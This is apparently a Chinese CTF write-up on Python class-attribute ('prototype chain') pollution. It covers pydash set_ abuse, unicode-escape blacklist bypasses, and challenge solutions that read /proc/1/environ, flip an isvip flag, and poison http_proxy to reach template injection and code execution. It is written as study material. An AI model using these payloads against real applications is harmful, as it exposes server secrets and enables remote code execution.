+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">test_str = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="comment">#set_(pydash,&#x27;helpers.RESTRICTED_KEYS&#x27;,&#x27;123&#x27;)</span></span><br><span class="line">set_(User(),<span class="string">&#x27;__class__.__init__.__globals__.test_str&#x27;</span>,<span class="string">&#x27;789666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(test_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将访问user()函数的属性，再以他为跳板，访问全局变量，从而修改test_str</p>
+<p>但实际操作中（可能是版本的原因）你会发现代码会报错</p>
+<p>这是因为pydash中有一个类似waf的东西（暂时先这么理解）</p>
+<p><img src="../images/image-20250926212608885.png" alt="image-20250926212608885" /></p>
+<p>这里会提示restricted key not allowed</p>
+<p>这里的restricted key是一个常量，位于pydash.helpers.RESTRICTED_KEY</p>
+<p>我们呢该如何绕过这个检验呢？</p>
+<p>很简单，只需要把这个restricted_key也污染就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">from</span> psutil <span class="keyword">import</span> users</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">test_str = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line">a=User()</span><br><span class="line">set_(pydash,<span class="string">&#x27;helpers.RESTRICTED_KEYS&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">set_(User(),<span class="string">&#x27;__class__.__init__.__globals__.test_str&#x27;</span>,<span class="string">&#x27;789666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(test_str)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250926212651642.png" alt="image-20250926212651642" /></p>
+<h2 id="魔术方法时机使用"><a class="markdownIt-Anchor" href="#魔术方法时机使用"></a> 魔术方法时机使用</h2>
+<p><strong><code>__class__</code> - 获取对象的类</strong></p>
+<p><strong>使用时机</strong>：当你有一个<strong>实例对象</strong>，想要访问它的类时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pollute = Pollute()  # 实例对象</span><br><span class="line">pollute.__class__    # 获取Pollute类</span><br><span class="line">作用：从实例 → 类</span><br></pre></td></tr></table></figure>
+<hr />
+<p><strong><code>__init__</code> - 获取类的构造函数方法</strong></p>
+<p><strong>使用时机</strong>：当你有一个<strong>类对象</strong>，想要访问它的初始化方法时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PolluteClass = pollute.__class__  # 类对象</span><br><span class="line">PolluteClass.__init__             # 获取__init__方法</span><br><span class="line">作用：从类 → 方法（函数对象）</span><br></pre></td></tr></table></figure>
+<hr />
+<p><strong><code>__globals__</code> - 获取函数的全局命名空间</strong></p>
+<p><strong>使用时机</strong>：当你有一个<strong>函数/方法对象</strong>，想要访问其全局变量时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init_method = PolluteClass.__init__  # 方法对象</span><br><span class="line">init_method.__globals__              # 获取全局变量字典</span><br><span class="line">作用：从函数 → 全局命名空间（包含模块级变量）</span><br></pre></td></tr></table></figure>
+<h2 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h2>
+<h3 id="unicode编码"><a class="markdownIt-Anchor" href="#unicode编码"></a> unicode编码</h3>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">	&quot;username&quot; : &quot;admin&quot;, </span><br><span class="line">	&quot;password&quot; : &quot;123456&quot;, # 在data中定义username和password保证data可以进入merge函数中</span><br><span class="line">	&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;: &#123; # 在check中可以看到有black_list,__init__被过滤了，使用unioncode进行绕过</span><br><span class="line">		&quot;__globals__&quot; : &#123;</span><br><span class="line">			&quot;__file__&quot;: &quot;../../../proc/1/environ&quot; # 大部分的flag都隐藏在环境变量中</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="python原型链污染例题"><a class="markdownIt-Anchor" href="#python原型链污染例题"></a> Python原型链污染例题</h2>
+<h3 id="ezflaskdasctf2023七月暑期挑战赛"><a class="markdownIt-Anchor" href="#ezflaskdasctf2023七月暑期挑战赛"></a> EzFlask(DASCTF2023七月暑期挑战赛)</h3>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>
+<p>直接在注册处进行污染即可</p>
+<p>记得unicode编码绕过</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/proc/1/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>然后访问根路由</p>
+<p><img src="../images/image-20250926201136761.png" alt="image-20250926201136761" /></p>
+<p>file文件模块已经被我们污染了</p>
+<p>当然，如果flag不在环境变量的话我们就要命令执行了，python下的命令执行除了代码中自带的，还有开启debug之后的console</p>
+<p>那么后面就是进行pin码计算了</p>
+<h3 id="geekchallenge2023ezpython"><a class="markdownIt-Anchor" href="#geekchallenge2023ezpython"></a> [GeekChallenge2023]ezpython</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;连用户名密码都没有你注册啥呢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;泰酷辣,没有注册成功捏&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;你的数字不对哦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;先登录去&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250926211038272.png" alt="image-20250926211038272" /></p>
+<p>直接链到User类，改变User中的isvip为true</p>
+<p><img src="../images/image-20250926211254522.png" alt="image-20250926211254522" /></p>
+<p>有waf</p>
+<p>unicode编码绕过</p>
+<p><img src="../images/image-20250926211436799.png" alt="image-20250926211436799" /></p>
+<p>访问/flag</p>
+<p><img src="../images/image-20250926211445970.png" alt="image-20250926211445970" /></p>
+<p>成功绕过，后面传个num就行了</p>
+<p>两种方法：<code>+123456789</code>或者<code>Non-ASCII Identifies</code>绕过（全角字符）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=12345678𝟗</span><br></pre></td></tr></table></figure>
+<p><img src="../images/79320cbe707ce0e699c688b6ddd7a831.png" alt="image-20231125162502175" /></p>
+<h3 id="安洵杯2023-原型链污染变体"><a class="markdownIt-Anchor" href="#安洵杯2023-原型链污染变体"></a> 安洵杯2023-原型链污染变体</h3>
+<p><img src="../images/1049983-20231225103127967-1170292261.png" alt="image.png" /></p>
+<ul>
+<li>发现/api-base/v0/search存在render_template_string(）,可导致ssti造成rce，只需要控制渲染内容即可</li>
+<li>uapate()函数中存在类似于原型链污染，可以利用来修改环境变量</li>
+</ul>
+<p><img src="../images/1049983-20231225103127461-983389685.png" alt="image.png" /></p>
+<h4 id="法一-污染http_proxy"><a class="markdownIt-Anchor" href="#法一-污染http_proxy"></a> 法一 污染http_proxy</h4>
+<p>这一步思路就是通过原型链污染，修改http_proxy环境变量，即可控制请求的响应数据来造成ssti，实现rce。</p>
+<p><code>http_proxy</code> 环境变量主要是由底层 HTTP 请求库（如 <code>requests</code>）使用的，在<code>requests.get</code>时请求就会走代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://47.108.206.43:40476/api-base/v0/update</span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;os&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;environ&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;http_proxy&quot;</span>:<span class="string">&quot;ip:port&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>开启监听，收到请求</p>
+<p><a target="_blank" rel="noopener" href="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140618936.png"><img src="../images/image-20231227140618936.png" alt="image-20231227140618936" /></a></p>
+<p>这里我们能控制请求的响应，所以根据响应包来对应写数据</p>
